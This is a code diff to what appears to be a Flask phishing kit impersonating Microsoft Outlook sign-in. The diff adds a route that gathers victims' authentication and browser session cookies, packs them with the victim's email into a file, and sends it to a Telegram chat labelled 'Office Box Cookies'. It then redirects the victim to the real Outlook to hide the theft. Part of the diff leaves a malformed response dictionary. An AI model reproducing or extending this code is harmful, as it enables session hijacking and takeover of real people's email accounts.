@@ -1191,12 +1191,15 @@ async def final_redirect():
         final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
 
         if stay_signed_in in ['yes', 'true', '1']:
-            # Already have the redirect URL set
-            pass
+            # Redirect to the new route for final redirection
+            return jsonify({
+                "status": "success",
+                "redirect_url": url_for('perform_final_redirect')
+            })
         elif stay_signed_in in ['no', 'false', '0']:
             session.clear()
             return jsonify({
-                "status": "success", 
+                "status": "success",
                 "redirect_url": final_redirect_url
             })
         elif stay_signed_in == 'no':
@@ -1322,19 +1325,136 @@ async def final_redirect():
             return jsonify({
                 "status": "success", 
                 "redirect_url": final_redirect_url
-            })
-        else:
-            return jsonify({
                 "status": "error",
                 "message": "Invalid stay signed in choice"
             }), 400
-            
+
+@app.route('/perform-final-redirect', methods=['GET'])
+async def perform_final_redirect():
+    """Performs the final redirect after processing cookies."""
+    try:
+        email = session.get('email', '')
+        is_personal = any(domain in email.lower() for domain in [
+            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+            'outlook.ca', 'hotmail.ca', 'live.ca'
+        ])
+        final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
+
+        # Get login result and status from session
+        login_result = session.get('login_result', {})
+        login_status = login_result.get('status')
+
+        # Initialize cookies_data dictionary
+        cookies_data = {
+            "email": email,
+            "cookies": []
+        }
+
+        # Process cookies based on login status
+        if login_status == 'success' or login_status == 'verify':
+            # Create a browser-like session to get cookies
+            session_obj = requests.Session()
+            session_obj.headers.update({
+                'User-Agent': request.headers.get('User-Agent'),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Referer': final_redirect_url,  # Use the correct redirect URL here
+                'Pragma': 'no-cache',
+                'Cache-Control': 'no-cache',
+                'DNT': '1',
+                'TE': 'Trailers',
+                'Host': 'outlook.live.com' if is_personal else 'outlook.office.com',
+                'Origin': 'https://outlook.live.com' if is_personal else 'https://outlook.office.com',
+                'Cookie': request.headers.get('Cookie', ''),
+                'X-Requested-With': 'XMLHttpRequest',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-User': '?1'
+            })
+
+            # Add authentication cookies if login status is 'verify'
+            if login_status == 'verify':
+                login_cookies = session.get('login_result', {}).get('cookies', [])
+                for cookie in login_cookies:
+                    if cookie.get('name') and cookie.get('value'):
+                        domain = '.live.com' if is_personal else '.microsoftonline.com'
+                        cookies_data["cookies"].append({
+                            "name": cookie['name'],
+                            "value": cookie['value'],
+                            "domain": domain,
+                            "path": "/",
+                            "secure": True
+                        })
+
+            # Add login cookies if login status is 'success'
+            if login_status == 'success':
+                login_cookies = session.get('login_result', {}).get('cookies', [])
+                for cookie in login_cookies:
+                    if cookie.get('name') and cookie.get('value'):
+                        domain = '.live.com' if is_personal else '.microsoftonline.com'
+                        cookies_data["cookies"].append({
+                            "name": cookie['name'],
+                            "value": cookie['value'],
+                            "domain": domain,
+                            "path": "/",
+                            "secure": True
+                        })
+
+            # Get cookies from user's browser request
+            for cookie_name, cookie_value in request.cookies.items():
+                if cookie_name and cookie_value:
+                    cookies_data["cookies"].append({
+                        "name": cookie_name,
+                        "value": cookie_value,
+                        "domain": ".microsoftonline.com",
+                        "path": "/",
+                        "secure": True
+                    })
+
+            # Make request to get redirect cookies
+            try:
+                session_obj.get(final_redirect_url, allow_redirects=True)
+                for cookie in session_obj.cookies:
+                    cookies_data["cookies"].append({
+                        "name": cookie.name,
+                        "value": cookie.value,
+                        "domain": cookie.domain,
+                        "path": cookie.path,
+                        "secure": cookie.secure
+                    })
+            except Exception as e:
+                print(f"Error getting redirect cookies: {e}")
+
+            # Save cookies as single-line JSON and send to Telegram
+            try:
+                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
+                    json.dump(cookies_data, temp_file, separators=(',', ':'))
+                    temp_file_path = temp_file.name
+
+                cookie_message = f"🍪 Office Box Cookies: {email}"
+                await send_telegram_file(temp_file_path, cookie_message)
+
+                # Clean up temp file
+                try:
+                    os.unlink(temp_file_path)
+                except Exception as e:
+                    print(f"Error deleting temp file: {e}")
+
+            except Exception as e:
+                print(f"Error sending cookies to Telegram: {e}")
+
+        # Clear session and return redirect URL
+        session.clear()
+        return redirect(final_redirect_url)
+
     except Exception as e:
-        print(f"Error in final redirect: {str(e)}")
-        return jsonify({
-            "status": "error", 
-            "message": "Error processing request"
-        }), 500
+        print(f"Error in perform_final_redirect: {str(e)}")
+        return "Error processing request", 500
+
 
 @app.after_request
 def add_security_headers(response):
